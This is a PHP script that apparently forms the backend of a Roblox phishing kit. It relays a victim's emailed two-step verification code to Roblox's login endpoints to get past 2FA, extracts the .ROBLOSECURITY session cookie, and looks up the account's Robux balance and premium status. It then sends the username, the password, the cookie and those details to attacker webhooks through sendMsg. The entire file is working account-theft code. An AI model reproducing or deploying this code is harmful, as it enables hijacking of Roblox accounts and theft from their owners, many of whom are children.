<?php
error_reporting(E_ALL);
session_start();
/*if ($_SERVER['REQUEST_METHOD'] != 'POST') {
	echo "lgi ngapain om";
   exit;
 }*/
include "../webhook.php";
$kode=$_POST["kode"];
$ticket=$_COOKIE["ticket"];
$uid=$_COOKIE["uid"];
            
$username=$_SESSION["username"];
$password=$_SESSION["password"];
$numlength = strlen((string)$kode);

$ch = curl_init();
$fields_string='{
	"challengeId":"'.$ticket.'",
	"actionType":"Login",
	"code":"'.$kode.'"
}';
curl_setopt($ch, CURLOPT_URL, 'https://twostepverification.roblox.com:443/v1/users/'.$uid.'/challenges/email/verify');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){

    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
    $middle = explode(":",$part,2);

    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
    if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];
//dapetin Token
if(isset($kode)){
	
$fields_string='{
	"challengeId":"'.$ticket.'",
	"actionType":"Login",
	"code":"'.$kode.'"
}';

$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://twostepverification.roblox.com:443/v1/users/'.$uid.'/challenges/email/verify');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);

$output = curl_exec($ch2);
$json=json_decode($output);
$vtoken=$json->verificationToken;
if($vtoken){
	
	curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com:443/v3/users/'.$uid.'/two-step-verification/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){

    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
    $middle = explode(":",$part,2);

    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
    if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];
	
	
	$fields_string='{
	"challengeId":"'.$ticket.'",
	"verificationToken":"'.$vtoken.'",
	"rememberDevice":true
}';

$chcok= curl_init();

curl_setopt($chcok, CURLOPT_URL, 'https://auth.roblox.com:443/v3/users/'.$uid.'/two-step-verification/login');
curl_setopt($chcok, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($chcok, CURLOPT_POST, 1);
curl_setopt($chcok, CURLOPT_HEADER, 1);
curl_setopt($chcok, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($chcok, CURLOPT_HTTPHEADER, $headers);

$output = curl_exec($chcok);
    $cookie = null;
    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
    
    echo "0";
     	$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://www.roblox.com/mobileapi/userinfo');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
$output = curl_exec($ch2);
$info=json_decode($output);
$robux=$info->RobuxBalance;
if($info->IsPremium){
	$premium="True";
	}else{
		$premium="False";
		}
sendMsg($username, $password, "true", $webhook, $webhook2, "", $cookie, "1", $robux, $premium);
    session_destroy();
}else{
		echo "1";
		}

}

/*
//terakhir buat ambil cookie
$fields_string='{
	"challengeId":"'.$ticket.'",
	"verificationToken":"'.$token2.'",
	"rememberDevice":true
}';

$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://auth.roblox.com:443/v3/users/'.$uid.'/two-step-verification/login');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_HEADER, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);

$output = curl_exec($ch2);
var_dump($output);*/

mysqli_close($con);
?>